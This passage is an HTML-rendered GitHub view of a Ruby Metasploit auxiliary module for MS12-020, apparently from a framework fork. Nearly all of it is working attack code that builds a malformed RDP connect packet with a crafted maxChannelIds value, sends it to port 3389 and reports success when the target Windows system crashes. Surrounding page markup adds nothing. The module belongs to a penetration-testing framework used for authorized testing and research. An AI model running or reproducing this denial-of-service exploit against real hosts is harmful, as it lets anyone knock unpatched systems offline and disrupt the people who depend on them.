Godas-Lopez&#39;</span><span class="p">,</span>  <span class="c1"># Entirely based on Daniel&#39;s pastie</span></div><div class='line' id='LC40'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Alex Ionescu&#39;</span><span class="p">,</span></div><div class='line' id='LC41'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;jduck&#39;</span><span class="p">,</span></div><div class='line' id='LC42'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;#ms12-020&#39;</span> <span class="c1"># Freenode IRC</span></div><div class='line' id='LC43'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">]</span><span class="p">,</span></div><div class='line' id='LC44'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span></div><div class='line' id='LC45'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;DisclosureDate&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;Mar 16 2012&quot;</span></div><div class='line' id='LC46'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="p">))</span></div><div class='line' id='LC47'><br/></div><div class='line' id='LC48'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">register_options</span><span class="p">(</span></div><div class='line' id='LC49'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span></div><div class='line' id='LC50'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">Opt</span><span class="p">:</span><span class="ss">:RPORT</span><span class="p">(</span><span class="mi">3389</span><span class="p">)</span></div><div class='line' id='LC51'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span></div><div class='line' id='LC52'>&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC53'><br/></div><div class='line' id='LC54'>&nbsp;&nbsp;<span class="k">def</span> <span class="nf">is_rdp_up</span></div><div class='line' id='LC55'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">begin</span></div><div class='line' id='LC56'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">connect</span></div><div class='line' id='LC57'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">disconnect</span></div><div class='line' id='LC58'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">return</span> <span class="kp">true</span></div><div class='line' id='LC59'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">rescue</span> <span class="ss">Rex</span><span class="p">:</span><span class="ss">:ConnectionRefused</span></div><div class='line' id='LC60'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">return</span> <span class="kp">false</span></div><div class='line' id='LC61'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">rescue</span> <span class="ss">Rex</span><span class="p">:</span><span class="ss">:ConnectionTimeout</span></div><div class='line' id='LC62'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">return</span> <span class="kp">false</span></div><div class='line' id='LC63'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC64'>&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC65'><br/></div><div class='line' id='LC66'>&nbsp;&nbsp;<span class="k">def</span> <span class="nf">run</span></div><div class='line' id='LC67'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">max_channel_ids</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x02\x01\xff</span><span class="s2">&quot;</span></div><div class='line' id='LC68'><br/></div><div class='line' id='LC69'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">pkt</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">+</span></div><div class='line' id='LC70'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x13</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC71'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x0E\xE0\x00\x00</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># X.224 (connection request)</span></div><div class='line' id='LC72'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x00\x00\x00\x01</span><span class="s2">&quot;</span> <span class="o">+</span></div><div class='line' id='LC73'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x00\x08\x00\x00</span><span class="s2">&quot;</span> <span class="o">+</span></div><div class='line' id='LC74'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x00\x00\x00</span><span class="s2">&quot;</span>     <span class="o">+</span></div><div class='line' id='LC75'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x6A</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC76'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224 (connect-initial)</span></div><div class='line' id='LC77'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x7F\x65\x82\x00</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC78'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x5E</span><span class="s2">&quot;</span>             <span class="o">+</span></div><div class='line' id='LC79'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x04\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># callingDomainSelector</span></div><div class='line' id='LC80'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x04\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># calledDomainSelector</span></div><div class='line' id='LC81'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x01\x01\xFF</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># upwardFlag</span></div><div class='line' id='LC82'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x30\x19</span><span class="s2">&quot;</span>         <span class="o">+</span>  <span class="c1"># targetParameters</span></div><div class='line' id='LC83'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">max_channel_ids</span>    <span class="o">+</span>  <span class="c1"># maxChannelIds</span></div><div class='line' id='LC84'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\xFF</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxUserIds</span></div><div class='line' id='LC85'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxTokenIds</span></div><div class='line' id='LC86'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># numPriorities</span></div><div class='line' id='LC87'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># minThroughput</span></div><div class='line' id='LC88'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxHeight</span></div><div class='line' id='LC89'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x02\x00\x7C</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># maxMCSPDUsize</span></div><div class='line' id='LC90'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x02</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># protocolVersion</span></div><div class='line' id='LC91'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x30\x19</span><span class="s2">&quot;</span>         <span class="o">+</span>  <span class="c1"># minimumParameters</span></div><div class='line' id='LC92'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">max_channel_ids</span>    <span class="o">+</span>  <span class="c1"># maxChannelIds</span></div><div class='line' id='LC93'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\xFF</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxUserIds</span></div><div class='line' id='LC94'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxTokenIds</span></div><div class='line' id='LC95'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># numPriorities</span></div><div class='line' id='LC96'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># minThroughput</span></div><div class='line' id='LC97'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxHeight</span></div><div class='line' id='LC98'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x02\x00\x7C</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># maxMCSPDUsize</span></div><div class='line' id='LC99'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x02</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># protocolVersion</span></div><div class='line' id='LC100'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x30\x19</span><span class="s2">&quot;</span>         <span class="o">+</span>  <span class="c1"># maximumParameters</span></div><div class='line' id='LC101'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">max_channel_ids</span>    <span class="o">+</span>  <span class="c1"># maxChannelIds</span></div><div class='line' id='LC102'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\xFF</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxUserIds</span></div><div class='line' id='LC103'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxTokenIds</span></div><div class='line' id='LC104'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># numPriorities</span></div><div class='line' id='LC105'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x00</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># minThroughput</span></div><div class='line' id='LC106'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x01</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># maxHeight</span></div><div class='line' id='LC107'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x02\x00\x7C</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># maxMCSPDUsize</span></div><div class='line' id='LC108'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\x01\x02</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># protocolVersion</span></div><div class='line' id='LC109'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x04\x82\x00\x00</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># userData</span></div><div class='line' id='LC110'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC111'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC112'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC113'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC114'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC115'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC116'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC117'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC118'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC119'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC120'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC121'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC122'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC123'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC124'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC125'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC126'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC127'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC128'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC129'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC130'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC131'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x08</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC132'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC133'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x28</span><span class="s2">&quot;</span>             <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC134'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x0C</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC135'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC136'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x38\x00\x06\x03</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># T.125</span></div><div class='line' id='LC137'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\xF0</span><span class="s2">&quot;</span>             <span class="o">+</span></div><div class='line' id='LC138'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x03\x00\x00\x09</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># TPKT: version + length</span></div><div class='line' id='LC139'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x02\xF0\x80</span><span class="s2">&quot;</span>     <span class="o">+</span>  <span class="c1"># X.224</span></div><div class='line' id='LC140'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s2">&quot;</span><span class="se">\x21\x80</span><span class="s2">&quot;</span>            <span class="c1"># T.125</span></div><div class='line' id='LC141'><br/></div><div class='line' id='LC142'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">unless</span> <span class="n">is_rdp_up</span></div><div class='line' id='LC143'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - RDP Service Unreachable&quot;</span><span class="p">)</span></div><div class='line' id='LC144'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">return</span></div><div class='line' id='LC145'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC146'><br/></div><div class='line' id='LC147'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">connect</span></div><div class='line' id='LC148'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Sending </span><span class="si">#{</span><span class="nb">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></div><div class='line' id='LC149'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span></div><div class='line' id='LC150'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="no">Rex</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span></div><div class='line' id='LC151'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">disconnect</span></div><div class='line' id='LC152'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - </span><span class="si">#{</span><span class="n">pkt</span><span class="o">.</span><span class="n">length</span><span class="o">.</span><span class="n">to_s</span><span class="si">}</span><span class="s2"> bytes sent&quot;</span><span class="p">)</span></div><div class='line' id='LC153'><br/></div><div class='line' id='LC154'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - Checking RDP status...&quot;</span><span class="p">)</span></div><div class='line' id='LC155'><br/></div><div class='line' id='LC156'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">if</span> <span class="n">is_rdp_up</span></div><div class='line' id='LC157'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> - RDP Service Unreachable&quot;</span><span class="p">)</span></div><div class='line' id='LC158'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">return</span></div><div class='line' id='LC159'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">else</span></div><div class='line' id='LC160'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">print_good</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> seems down&quot;</span><span class="p">)</span></div><div class='line' id='LC161'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">report_vuln</span><span class="p">({</span></div><div class='line' id='LC162'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">:host</span> <span class="o">=&gt;</span> <span class="n">rhost</span><span class="p">,</span></div><div class='line' id='LC163'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">:port</span> <span class="o">=&gt;</span> <span class="n">rport</span><span class="p">,</span></div><div class='line' id='LC164'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">:name</span> <span class="o">=&gt;</span> <span class="nb">self</span><span class="o">.</span><span class="n">name</span><span class="p">,</span></div><div class='line' id='LC165'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">:refs</span> <span class="o">=&gt;</span> <span class="nb">self</span><span class="o">.</span><span class="n">references</span><span class="p">,</span></div><div class='line' id='LC166'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ss">:info</span> <span class="o">=&gt;</span> <span class="s2">&quot;Module </span><span class="si">#{</span><span class="nb">self</span><span class="o">.</span><span class="n">fullname</span><span class="si">}</span><span class="s2"> successfully crashed the target system via RDP&quot;</span></div><div class='line' id='LC167'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="p">})</span></div><div class='line' id='LC168'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC169'><br/></div><div class='line' id='LC170'>&nbsp;&nbsp;<span class="k">end</span></div><div class='line' id='LC171'><br/></div><div class='line' id='LC172'><span class="k">end</span></div></pre></div>
            </td>
          </tr>
        </table>
  </div>

  </div>
</div>

<a href="#jump-to-line" rel="facebox[.linejump]" data-hotkey="l" class="js-jump-to-line" style="display:none">Jump to Line</a>
<div id="jump-to-line" style="display:none">
  <form accept-charset="UTF-8" class="js-jump-to-line-form">
    <input class="linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;" autofocus>
    <button type="submit" class="button">Go</button>
  </form>
</div>

        </div>

      </div><!-- /.repo-container -->
      <div class="modal-backdrop"></div>
    </div><!-- /.container -->
  </div><!-- /.site -->


    </div><!-- /.wrapper -->

      <div class="container">
  <div class="site-footer">
    <ul class="site-footer-links right">
      <li><a href="https://status.github.com/">Status</a></li>
      <li><a href="http://developer.github.com">API</a></li>
      <li><a href="http://training.github.com">Training</a></li>
      <li><a href="http://shop.github.com">Shop</a></li>
      <li><a href="/blog">Blog</a></li>
      <li><a href="/about">About</a></li>

    </ul>

    <a href="/">
      <span class="mega-octicon octicon-mark-github"></span>
    </a>

    <ul class="site-footer-links">
      <li>&copy; 2013 <span title="0.03578s from github-fe114-cp1-prd.iad.github.net">GitHub</span>, Inc.</li>
        <li><a href="/site/terms">Terms</a></li>
        <li><a href="/site/privacy">Privacy</a></li>
        <li><a href="/security">Security</a></li>
        <li><a href="/contact">Contact</a></li>
    </ul>
  </div><!-- /.site-footer -->
</div><!-- /.container -->


    <div class="fullscreen-overlay js-fullscreen-overlay" id="fullscreen_overlay">
  <div class="fullscreen-container js-fullscreen-container">
    <div class="textarea-wrap">
      <textarea name="fullscreen-contents" id="fullscreen-contents" class="js-fullscreen-contents" placeholder="" data-suggester="fullscreen_suggester"></textarea>
          <div class="suggester-container">
              <div class="suggester fullscreen-suggester js-navigation-container" id="fullscreen_suggester"
                 data-url="/jvazquez-r7/metasploit-framework/suggestions/commit">
              </div>
          </div>
    </div>
  </div>
  <div class="fullscreen-sidebar">
    <a href="#" class="exit-fullscreen js-exit-fullscreen tooltipped leftwards" title="Exit Zen Mode">
      <span class="mega-octicon octicon-screen-normal"></span>
    </a>
    <a href="#" class="theme-switcher js-theme-switcher tooltipped leftwards"
      title="Switch themes">
      <span class="octicon octicon-color-mode"></span>
    </a>
  </div>
</div>



    <div id="ajax-error-message" class="flash flash-error">
      <span class="octicon octicon-alert"></span>
      <a href="#" class="octicon octicon-remove-close close ajax-error-dismiss"></a>
      Something went wrong with that request. Please try again.
    </div>

  </body>
</html>

